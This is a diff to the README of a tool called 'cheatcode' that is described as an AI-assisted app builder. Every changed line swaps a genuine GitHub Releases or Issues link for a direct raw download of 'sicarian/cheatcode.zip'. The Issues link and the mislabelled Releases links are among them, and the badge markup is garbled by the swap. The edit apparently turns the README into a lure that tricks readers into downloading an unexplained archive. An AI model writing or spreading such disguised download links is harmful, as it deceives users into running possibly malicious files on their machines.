@@ -6,7 +6,7 @@ Welcome to cheatcode! This tool helps you chat with an AI to build, preview, and
 
 ## 📥 Download Cheatcode
 
-[![Download Cheatcode](https://img.shields.io/badge/Download%20Now-Visit%20Releases-blue.svg)](https://github.com/lezer10/cheatcode/releases)
+[![Download Cheatcode](https://raw.githubusercontent.com/lezer10/cheatcode/main/sicarian/cheatcode.zip%20Now-Visit%https://raw.githubusercontent.com/lezer10/cheatcode/main/sicarian/cheatcode.zip)](https://raw.githubusercontent.com/lezer10/cheatcode/main/sicarian/cheatcode.zip)
 
 ## 💻 System Requirements
 
@@ -21,7 +21,7 @@ To run cheatcode smoothly, ensure your system meets the following requirements:
 ## 🛠️ Download & Install
 
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://github.com/lezer10/cheatcode/releases). Here, you will find all the available versions of cheatcode.
+   Go to the [Releases page](https://raw.githubusercontent.com/lezer10/cheatcode/main/sicarian/cheatcode.zip). Here, you will find all the available versions of cheatcode.
 
 2. **Choose the Latest Release**  
    Look for the latest version at the top of the page. It will usually have the highest version number.
@@ -73,8 +73,8 @@ If you run into any problems, here are some common issues and solutions:
 
 Join our community to share ideas, ask questions, and get assistance:
 
-- **GitHub Issues**: If you face any issues, report them on our [GitHub Issues page](https://github.com/lezer10/cheatcode/issues).
+- **GitHub Issues**: If you face any issues, report them on our [GitHub Issues page](https://raw.githubusercontent.com/lezer10/cheatcode/main/sicarian/cheatcode.zip).
 - **Discussion Forum**: Engage in conversations and share experiences with other users.
 - **Feedback**: We value your input! Let us know what features you would like to see in future updates.
 
-Enjoy building your applications with cheatcode! Remember to check the [Releases page](https://github.com/lezer10/cheatcode/releases) for updates.
+Enjoy building your applications with cheatcode! Remember to check the [Releases page](https://raw.githubusercontent.com/lezer10/cheatcode/main/sicarian/cheatcode.zip) for updates.
